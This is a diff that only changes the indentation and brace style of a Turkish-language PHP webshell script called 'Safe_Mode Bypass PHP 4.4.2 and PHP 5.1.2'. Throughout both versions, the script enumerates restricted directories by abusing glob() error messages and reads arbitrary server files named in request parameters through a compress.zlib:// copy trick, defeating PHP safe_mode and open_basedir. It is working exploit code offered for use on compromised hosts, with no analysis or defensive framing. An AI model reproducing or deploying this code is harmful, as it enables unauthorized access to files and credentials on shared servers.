@@ -26,157 +26,166 @@
  	         
                                <?php
  
- 	/*
- 	Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
- 	By KingDefacer From Spygrup.org>
- 	*/
- 	
+    /*
+    Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
+    By KingDefacer From Spygrup.org>
+    */
+    
  
  
- 	$tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp
+    $tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp
  
- 	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
- 	{
- 	 $safemode = true;
- 	 $hsafemode = "<font color=\"red\">A&#231;ik (G&#252;venli)</font>";
- 	}
- 	else {$safemode = false; $hsafemode = "<font color=\"green\">Kapali (G&#252;venli Degil)</font>";}
- 	echo("G&#252;venlik: $hsafemode");
- 	$v = @ini_get("open_basedir");
- 	if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
- 	else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">Kapali (G&#252;venli Degil)</font>";}
- 	echo("<br>");
- 	echo("Klas&#246;rler Arasi Dolasim: $hopenbasedir");
- 	echo("<br>");
- 	$version=("Bypass Version 1.1 Beta");
- 	echo "Engelleyici Program : <b>";
- 	if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>G&#246;r&#252;n&#252;rde Bi&#351;iy Yok</font></b>";}else{echo "<font color=red>$df</font></b>";}
- 	$free = @diskfreespace($dir);
- 	if (!$free) {$free = 0;}
- 	$all = @disk_total_space($dir);
- 	if (!$all) {$all = 0;}
- 	$used = $all-$free;
- 	$used_percent = @round(100/($all/$free),2);
- 	  error_reporting(E_WARNING);
- 	  ini_set("display_errors", 1);
- 	
+    if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
+        $safemode = true;
+        $hsafemode = "<font color=\"red\">A&#231;ik (G&#252;venli)</font>";
+    } else {
+        $safemode = false;
+        $hsafemode = "<font color=\"green\">Kapali (G&#252;venli Degil)</font>";
+    }
+    echo("G&#252;venlik: $hsafemode");
+    $v = @ini_get("open_basedir");
+    if ($v or strtolower($v) == "on") {
+        $openbasedir = true;
+        $hopenbasedir = "<font color=\"red\">".$v."</font>";
+    } else {
+        $openbasedir = false;
+        $hopenbasedir = "<font color=\"green\">Kapali (G&#252;venli Degil)</font>";
+    }
+    echo("<br>");
+    echo("Klas&#246;rler Arasi Dolasim: $hopenbasedir");
+    echo("<br>");
+    $version=("Bypass Version 1.1 Beta");
+    echo "Engelleyici Program : <b>";
+    if (''==($df=@ini_get('disable_functions'))) {
+        echo "<font color=green>G&#246;r&#252;n&#252;rde Bi&#351;iy Yok</font></b>";
+    } else {
+        echo "<font color=red>$df</font></b>";
+    }
+    $free = @diskfreespace($dir);
+    if (!$free) {
+        $free = 0;
+    }
+    $all = @disk_total_space($dir);
+    if (!$all) {
+        $all = 0;
+    }
+    $used = $all-$free;
+    $used_percent = @round(100/($all/$free), 2);
+      error_reporting(E_WARNING);
+      ini_set("display_errors", 1);
+    
  
- 	  echo "<head><title>".getcwd()."</title></head>";
+      echo "<head><title>".getcwd()."</title></head>";
  
- 	  echo"<hr color=\"#C0C0C0\" size=\"1\">";
- 	  echo("<br>");
- 	        echo "<form method=GET>";
- 	  echo "<div style='float: left'>ByPass Edilecek Dizin: <input type=text name=root value='{$_GET['root']}'></div>";
- 	  echo "<input type=submit value='--&raquo;'></form>";
- 
- 
- 	  $root = "./";
- 
- 	  if($_POST['root']) $root = $_POST['root'];
- 	               if($_GET['root']) $root = $_GET['root'];
- 	  if (!ini_get('safe_mode')) die("Safe-mode  OFF.");
- 
- 	  $c = 0; $D = array();
- 	  set_error_handler("eh");
- 
- 	  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
- 
- 	  for($i=0; $i < strlen($chars); $i++){
- 	  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}";
- 
- 	  $prevD = $D[count($D)-1];
-       glob($path."*");
- 
- 	        if($D[count($D)-1] != $prevD){
- 
- 	        for($j=0; $j < strlen($chars); $j++){
- 
- 	           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}";
- 
- 	           $prevD2 = $D[count($D)-1];
- 	           glob($path."*");
- 
- 	              if($D[count($D)-1] != $prevD2){
+      echo"<hr color=\"#C0C0C0\" size=\"1\">";
+      echo("<br>");
+            echo "<form method=GET>";
+      echo "<div style='float: left'>ByPass Edilecek Dizin: <input type=text name=root value='{$_GET['root']}'></div>";
+      echo "<input type=submit value='--&raquo;'></form>";
  
  
- 	                 for($p=0; $p < strlen($chars); $p++){
+      $root = "./";
  
- 	                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";
+      if ($_POST['root']) {
+          $root = $_POST['root'];
+      }
+                   if ($_GET['root']) {
+                       $root = $_GET['root'];
+                   }
+      if (!ini_get('safe_mode')) {
+          die("Safe-mode  OFF.");
+      }
  
- 	                 $prevD3 = $D[count($D)-1];
- 	                 glob($path."*");
+      $c = 0; $D = array();
+      set_error_handler("eh");
  
- 	                    if($D[count($D)-1] != $prevD3){
+      $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+ 
+      for ($i=0; $i < strlen($chars); $i++) {
+          $path ="{$root}".((substr($root, -1)!="/") ? "/" : null)."{$chars[$i]}";
+ 
+          $prevD = $D[count($D)-1];
+          glob($path."*");
+ 
+          if ($D[count($D)-1] != $prevD) {
+              for ($j=0; $j < strlen($chars); $j++) {
+                  $path ="{$root}".((substr($root, -1)!="/") ? "/" : null)."{$chars[$i]}{$chars[$j]}";
+ 
+                  $prevD2 = $D[count($D)-1];
+                  glob($path."*");
+ 
+                  if ($D[count($D)-1] != $prevD2) {
+                      for ($p=0; $p < strlen($chars); $p++) {
+                          $path ="{$root}".((substr($root, -1)!="/") ? "/" : null)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";
+ 
+                          $prevD3 = $D[count($D)-1];
+                          glob($path."*");
+ 
+                          if ($D[count($D)-1] != $prevD3) {
+                              for ($r=0; $r < strlen($chars); $r++) {
+                                  $path ="{$root}".((substr($root, -1)!="/") ? "/" : null)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
+                                  glob($path."*");
+                              }
+                          }
+                      }
+                  }
+              }
+          }
+      }
+ 
+      $D = array_unique($D);
+ 
+      echo "<xmp>";
+      foreach ($D as $item) {
+          echo "{$item}\n";
+      }
+      echo "</xmp>";
  
  
- 	                       for($r=0; $r < strlen($chars); $r++){
- 
- 	                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
- 	                       glob($path."*");
- 
- 	                       }
- 
- 	                    }
- 
- 	                 }
- 
- 	              }
- 
- 	        }
- 
- 	        }
- 
- 	  }
- 
- 	  $D = array_unique($D);
- 
- 	  echo "<xmp>";
- 	  foreach($D as $item) echo "{$item}\n";
- 	  echo "</xmp>";
  
  
- 
- 
- 	  function eh($errno, $errstr, $errfile, $errline){
- 
- 	     global $D, $c, $i;
- 	     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
- 	     if($o){ $D[$c] = $o[2]; $c++;}
- 
- 	  }
- 	echo "<PRE>\n";
- 	if(empty($file)){
- 	if(empty($_GET['file'])){
- 	if(empty($_POST['file'])){
- 	die("\nHosgeldiniz...Bu Scriptle Sadece c99'da  (Safe Mode=ON) Olan Serverlarda Bypass Yapilabilir Digerlerinde Calismaz  .. Kolay Gelsin\n <B><CENTER><FONT
+      function eh($errno, $errstr, $errfile, $errline)
+      {
+          global $D, $c, $i;
+          preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
+          if ($o) {
+              $D[$c] = $o[2];
+              $c++;
+          }
+      }
+    echo "<PRE>\n";
+    if (empty($file)) {
+        if (empty($_GET['file'])) {
+            if (empty($_POST['file'])) {
+                die("\nHosgeldiniz...Bu Scriptle Sadece c99'da  (Safe Mode=ON) Olan Serverlarda Bypass Yapilabilir Digerlerinde Calismaz  .. Kolay Gelsin\n <B><CENTER><FONT
  	COLOR=\"RED\">
  	kingdefacer@msn.com</FONT></CENTER></B>");
- 	} else {
- 	$file=$_POST['file'];
- 	}
- 	} else {
- 	$file=$_GET['file'];
- 	}
- 	}
+            } else {
+                $file=$_POST['file'];
+            }
+        } else {
+            $file=$_GET['file'];
+        }
+    }
  
- 	$temp=tempnam($tymczas, "cx");
+    $temp=tempnam($tymczas, "cx");
  
- 	if(copy("compress.zlib://".$file, $temp)){
- 	$zrodlo = fopen($temp, "r");
- 	$tekst = fread($zrodlo, filesize($temp));
- 	fclose($zrodlo);
- 	 echo"<hr color=\"#C0C0C0\" size=\"1\">";
- 	echo "<FONT COLOR=\"RED\"><B>--- Start File ".htmlspecialchars($file)."
+    if (copy("compress.zlib://".$file, $temp)) {
+        $zrodlo = fopen($temp, "r");
+        $tekst = fread($zrodlo, filesize($temp));
+        fclose($zrodlo);
+        echo"<hr color=\"#C0C0C0\" size=\"1\">";
+        echo "<FONT COLOR=\"RED\"><B>--- Start File ".htmlspecialchars($file)."
  	-------------</B><FONT COLOR=\"white\">\n".htmlspecialchars($tekst)."\n<B>--- End File
  	".htmlspecialchars($file)." ---------------\n";
- 	unlink($temp);
- 	die("\n<FONT COLOR=\"RED\"><B>File
+        unlink($temp);
+        die("\n<FONT COLOR=\"RED\"><B>File
  	".htmlspecialchars($file)." Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>
  	;]</B></FONT>");
- 	} else {
- 	die("<FONT COLOR=\"RED\"><CENTER>Uzgunum...
+    } else {
+        die("<FONT COLOR=\"RED\"><CENTER>Uzgunum...
  	<B>".htmlspecialchars($file)."</B> Aradiginiz dosya Bulunamadi
  	access.</CENTER></FONT>");
- 	}
+    }
  
- 	?>
+    ?>
